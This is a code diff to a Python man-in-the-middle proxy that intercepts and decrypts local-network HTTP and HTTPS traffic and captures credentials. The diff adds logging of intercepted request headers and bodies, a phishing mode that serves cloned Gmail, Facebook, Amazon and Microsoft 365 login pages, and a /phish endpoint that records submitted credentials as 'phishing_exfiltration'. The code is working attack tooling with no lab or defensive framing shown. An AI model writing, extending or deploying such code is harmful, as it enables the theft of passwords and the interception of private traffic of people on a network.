@@ -201,15 +201,29 @@ def handle_transparent_http(client_conn, client_addr):
         with stats_lock:
             global total_bytes_intercepted
             total_bytes_intercepted += len(response_bytes)
+        # Build a sanitized header dict for the GUI inspector
+        req_headers = {}
+        for hl in header_lines[1:]:
+            hl_str = hl.decode("utf-8", errors="ignore")
+            if ":" in hl_str:
+                k, _, v = hl_str.partition(":")
+                req_headers[k.strip()] = v.strip()
+        body_snippet = body[:2048].decode("utf-8", errors="ignore") if body else ""
+        intercepted = bool(body and any(k.lower() in ("content-type",) and "form" in req_headers.get(k, "").lower() for k in req_headers))
         traffic_log.add({
             "protocol": "http",
             "method": method,
+            "host": domain,
             "domain": domain,
             "path": path,
             "status": status_code,
             "content_type": content_type,
             "size": body_len,
+            "src_ip": client_addr[0],
             "source_ip": client_addr[0],
+            "headers": req_headers,
+            "body": body_snippet,
+            "intercepted": intercepted or method == "POST",
         })
 
         # Capture credentials
@@ -301,15 +315,28 @@ def handle_transparent_https(client_conn, client_addr):
         status_code, content_type, body_len = parse_response_meta(bytes(response_bytes))
         with stats_lock:
             total_bytes_intercepted += len(response_bytes)
+        # Build a sanitized header dict for the GUI inspector
+        req_headers_https = {}
+        for hl in header_lines[1:]:
+            hl_str = hl.decode("utf-8", errors="ignore")
+            if ":" in hl_str:
+                k, _, v = hl_str.partition(":")
+                req_headers_https[k.strip()] = v.strip()
+        body_snippet_https = body[:2048].decode("utf-8", errors="ignore") if body else ""
         traffic_log.add({
             "protocol": "https",
             "method": method,
+            "host": domain,
             "domain": domain,
             "path": path,
             "status": status_code,
             "content_type": content_type,
             "size": body_len,
+            "src_ip": client_addr[0],
             "source_ip": client_addr[0],
+            "headers": req_headers_https,
+            "body": body_snippet_https,
+            "intercepted": True,  # HTTPS is always decrypted/intercepted
         })
 
         # Capture credentials from the DECRYPTED request
@@ -331,7 +358,7 @@ def handle_transparent_https(client_conn, client_addr):
         except Exception:
             pass
 
-def handle_dashboard_request(client_conn, method, path, header_lines, client_addr):
+def handle_dashboard_request(client_conn, method, path, header_lines, client_addr, body=b""):
     """Handles requests to the LAN-facing dashboard (8080)."""
     try:
         path = path.split("?")[0]
@@ -374,7 +401,59 @@ def handle_dashboard_request(client_conn, method, path, header_lines, client_add
             response = b"\r\n".join(response_headers) + b"\r\n\r\n" + stats_json
             client_conn.sendall(response)
 
-        elif path == "/" or path == "/index.html":
+        elif path == "/" or path == "/index.html" or path == "/auth/login":
+            # Check if phishing mode is active
+            phish_active = False
+            phish_template = "gmail"
+            phish_redirect = "https://mail.google.com"
+            if os.path.exists("phishing_state.json"):
+                try:
+                    with open("phishing_state.json", "r") as f:
+                        pstate = json.load(f)
+                        phish_active = pstate.get("active", False)
+                        phish_template = pstate.get("template", "gmail")
+                        phish_redirect = pstate.get("redirect_url", "https://mail.google.com")
+                except Exception:
+                    pass
+
+            if phish_active:
+                # Dynamically generate phishing page html based on the active template
+                from phishing_generator import PhishingPageLibrary
+                html = ""
+                if phish_template == "gmail":
+                    html = PhishingPageLibrary.gmail_clone_html(phish_redirect)
+                elif phish_template == "facebook":
+                    html = PhishingPageLibrary.facebook_clone_html(phish_redirect)
+                elif phish_template == "amazon":
+                    html = PhishingPageLibrary.amazon_clone_html(phish_redirect)
+                elif phish_template == "m365":
+                    # Let's check if PhishingPageLibrary has m365_clone_html or similar
+                    if hasattr(PhishingPageLibrary, 'm365_clone_html'):
+                        html = PhishingPageLibrary.m365_clone_html(phish_redirect)
+                    elif hasattr(PhishingPageLibrary, 'microsoft_clone_html'):
+                        html = PhishingPageLibrary.microsoft_clone_html(phish_redirect)
+                    else:
+                        # Fallback/dynamic creation
+                        html = getattr(PhishingPageLibrary, 'gmail_clone_html')(phish_redirect)
+                elif phish_template == "generic":
+                    if hasattr(PhishingPageLibrary, 'generic_clone_html'):
+                        html = PhishingPageLibrary.generic_clone_html(phish_redirect)
+                    else:
+                        html = getattr(PhishingPageLibrary, 'gmail_clone_html')(phish_redirect)
+                else:
+                    html = PhishingPageLibrary.gmail_clone_html(phish_redirect)
+
+                html_bytes = html.encode("utf-8")
+                response_headers = [
+                    b"HTTP/1.1 200 OK",
+                    b"Content-Type: text/html; charset=utf-8",
+                    f"Content-Length: {len(html_bytes)}".encode("utf-8"),
+                    b"Connection: close",
+                ]
+                response = b"\r\n".join(response_headers) + b"\r\n\r\n" + html_bytes
+                client_conn.sendall(response)
+                return
+
             html = DASHBOARD_HTML.replace("{LOCAL_IP}", LOCAL_IP).replace("{CONTROL_PANEL_URL}",
                 f"http://{CONTROL_PANEL_HOST}:{CONTROL_PANEL_PORT}/")
             html_bytes = html.encode("utf-8")
@@ -386,6 +465,42 @@ def handle_dashboard_request(client_conn, method, path, header_lines, client_add
             ]
             response = b"\r\n".join(response_headers) + b"\r\n\r\n" + html_bytes
             client_conn.sendall(response)
+
+        elif path == "/phish" and method == "POST":
+            # Extract posted credential JSON
+            try:
+                content_length = int(get_header_value(header_lines, "content-length") or 0)
+                body_data = body
+                while len(body_data) < content_length:
+                    chunk = client_conn.recv(4096)
+                    if not chunk:
+                        break
+                    body_data += chunk
+                
+                # Parse JSON
+                payload = json.loads(body_data.decode("utf-8", errors="ignore"))
+                target_service = payload.get("target", "Unknown")
+                credentials = payload.get("credentials", {})
+                
+                # Log captured credentials to creds_log
+                creds_entry = {
+                    "type": "phishing_exfiltration",
+                    "domain": target_service,
+                    "source_ip": client_addr[0],
+                    "fields": credentials,
+                    "timestamp": float(time.time())
+                }
+                creds_log.add(creds_entry)
+                
+                # Also append to logs_user/credentials.jsonl so the daemon tails it and broadcasts it to GUI
+                os.makedirs("logs_user", exist_ok=True)
+                with open("logs_user/credentials.jsonl", "a", encoding="utf-8") as f:
+                    f.write(json.dumps(creds_entry) + "\n")
+                
+                print(f"[Phishing] Intercepted {target_service} credentials from {client_addr[0]}: {credentials}")
+            except Exception as ex:
+                print(f"[Phishing Error] Failed to parse exfiltrated credentials: {ex}")
+            send_simple_response(client_conn, 200, "OK", b"{\"status\":\"success\"}")
 
         else:
             send_simple_response(client_conn, 404, "Not Found", b"Not found.")
@@ -467,12 +582,12 @@ def handle_dashboard_client(client_conn, client_addr):
         request_data = client_conn.recv(4096)
         if not request_data:
             return
-        header_lines, _ = split_headers_body(request_data)
+        header_lines, body = split_headers_body(request_data)
         request_line = header_lines[0].decode("utf-8", errors="ignore")
         parts = request_line.split()
         if len(parts) >= 3:
             method, path, version = parts[0], parts[1], parts[2]
-            handle_dashboard_request(client_conn, method, path, header_lines, client_addr)
+            handle_dashboard_request(client_conn, method, path, header_lines, client_addr, body)
     except Exception as e:
         print(f"[Dashboard] {e}")
     finally:
